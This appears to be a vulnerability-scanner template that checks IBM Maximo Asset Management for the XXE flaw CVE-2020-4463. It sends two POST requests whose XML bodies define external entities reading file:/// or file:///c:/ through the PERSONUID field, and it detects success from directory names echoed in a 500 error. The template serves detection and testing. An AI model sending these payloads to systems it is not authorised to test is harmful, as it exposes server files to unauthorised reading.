id: cve-2020-4463
info:
  name: IBM Maximo Asset Management XXE (CVE-2020-4463)
  risk: High

params:
  - root: "{{.BaseURL}}"

replicate:
  prefixes: 'maximo'

requests:
  - method: POST
    redirect: false
    url: >-
      {{.root}}/meaweb/os/mxperson
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
      - Content-Type: application/xml    
    body: |
        <?xml version='1.0' encoding='UTF-8'?>
        <!DOCTYPE foo [
            <!ELEMENT foo ANY>
            <!ENTITY xxe SYSTEM "file:///">
        ]>
        <max:QueryMXPERSON xmlns:max='http://www.ibm.com/maximo'>
            <max:MXPERSONQuery>
                <max:PERSON>
                    <max:PERSONUID>&xxe;</max:PERSONUID>
                </max:PERSON>
            </max:MXPERSONQuery>
        </max:QueryMXPERSON>
    detections:
      - >-
        StatusCode() == 500 && StringSearch('response', 'Error 500: For input string') && StringSearch('response', 'bin')
  - method: POST
    redirect: false
    url: >-
      {{.root}}/meaweb/os/mxperson
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
      - Content-Type: application/xml    
    body: |
        <?xml version='1.0' encoding='UTF-8'?>
        <!DOCTYPE foo [
            <!ELEMENT foo ANY>
            <!ENTITY xxe SYSTEM "file:///c:/">
        ]>
        <max:QueryMXPERSON xmlns:max='http://www.ibm.com/maximo'>
            <max:MXPERSONQuery>
                <max:PERSON>
                    <max:PERSONUID>&xxe;</max:PERSONUID>
                </max:PERSON>
            </max:MXPERSONQuery>
        </max:QueryMXPERSON>
    detections:
      - >-
        StatusCode() == 500 && StringSearch('response', 'Error 500: For input string') && StringSearch('response', 'Windows')
references:
  - reference: https://github.com/Ibonok/CVE-2020-4463 